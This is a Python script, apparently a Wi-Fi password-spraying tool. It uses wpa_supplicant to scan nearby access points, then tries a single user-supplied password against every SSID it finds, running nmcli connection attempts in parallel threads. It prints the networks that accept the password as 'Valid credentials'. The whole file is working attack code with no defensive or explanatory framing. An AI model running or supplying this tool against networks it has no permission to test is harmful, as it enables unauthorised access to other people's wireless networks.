import argparse
from wpa_supplicant.core import WpaSupplicantDriver, InterfaceExists
from twisted.internet.selectreactor import SelectReactor
from txdbus.error import IntrospectionFailed
import threading
import time
import sys
import nmcli


class NetworkManager:
    def connect(self, ssid, password):
        pass


class NMCli(NetworkManager):
    def connect(self, ssid, password):
        nmcli.device.wifi_connect(ssid, password, wait=3)


class ScanAccessPoints:

    def __init__(self, interface_name):
        self.access_points = {}
        self.successful_logins = []
        self.interface_name = interface_name

    def print_message_and_exit(self, message):
        print(message + ", exiting...")
        sys.exit()

    def start_reactor(self):
        try:
            self.reactor = SelectReactor()
            self.thread = threading.Thread(
                target=self.reactor.run, kwargs={"installSignalHandlers": 0}
            )
            self.thread.daemon = True
            self.thread.start()
            time.sleep(0.1)
        except Exception:
            self.print_message_and_exit("Could not start reactor")

    def stop_reactor(self):
        try:
            self.reactor.stop()
        except Exception:
            self.print_message_and_exit("Could not stop reactor")

    def start_driver(self):
        try:
            self.driver = WpaSupplicantDriver(self.reactor)
        except Exception:
            self.print_message_and_exit("Could not start driver")

    def connect_supplicant(self):
        try:
            self.supplicant = self.driver.connect()
        except IntrospectionFailed:
            self.print_message_and_exit(
                "Could not connect with supplicant, you need to run with sudo"
            )
        except Exception:
            self.print_message_and_exit("Could not connect with supplicant")

    def get_interface(self):
        try:
            self.interface = self.supplicant.create_interface(self.interface_name)
        except InterfaceExists:
            self.interface = self.supplicant.get_interface(self.interface_name)
        except Exception:
            self.print_message_and_exit("Could not get interface")

    def scan_access_points(self):
        try:
            scan_results = self.interface.scan(block=True)

            for bss in scan_results:
                if bss.get_ssid():
                    self.access_points[bss.get_bssid()] = bss.get_ssid()
        except Exception:

            self.print_message_and_exit("Could not scan access points")

    def scan(self):
        print("Scanning access points...")
        self.start_reactor()
        self.start_driver()
        self.connect_supplicant()
        self.get_interface()
        self.scan_access_points()
        self.stop_reactor()

    def login(self, lock, network_manager: NetworkManager, ssid, password):
        try:
            print(f"Trying to connect to {ssid}")
            if lock:
                with lock:
                    network_manager.connect(ssid, password)
            else:
                network_manager.connect(ssid, password)
            self.successful_logins.append({ssid: password})
            print(f"Successfully connected to {ssid}:{password}")
        except Exception:
            print(f"Could not connect to {ssid}")


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-p", "--password", dest="password", required=True, help="Password for spray"
    )
    parser.add_argument(
        "-i", "--interface", dest="interface", required=True, help="Interface name"
    )
    parser.add_argument(
        "-w",
        "--wait",
        dest="wait",
        action="store_true",
        default=False,
        required=False,
        help="Wait for results",
    )
    args = parser.parse_args()
    return args


if __name__ == "__main__":
    arguments = get_arguments()
    wait_for_results = True if arguments.wait else False
    interface_name = arguments.interface
    scanner = ScanAccessPoints(interface_name)
    scanner.scan()
    access_points = scanner.access_points
    network_manager = NMCli()
    lock = threading.Lock() if wait_for_results else False

    for ssid in access_points.values():
        thread = threading.Thread(
            target=scanner.login,
            kwargs={
                "lock": lock,
                "network_manager": network_manager,
                "ssid": ssid,
                "password": arguments.password,
            },
        )
        thread.daemon = True
        thread.start()

    if lock:
        for thread in threading.enumerate():
            if thread != threading.current_thread():
                thread.join()

        print()
        print("Valid credentials")
        for access_point in scanner.successful_logins:
            ssid = list(access_point.keys())[0]
            password = list(access_point.values())[0]
            print(f"{ssid} : {password}")
    else:
        print(
            "You will not see successful login results,"
            + " but your system should automatically"
            + " connect if there was any successful login"
        )
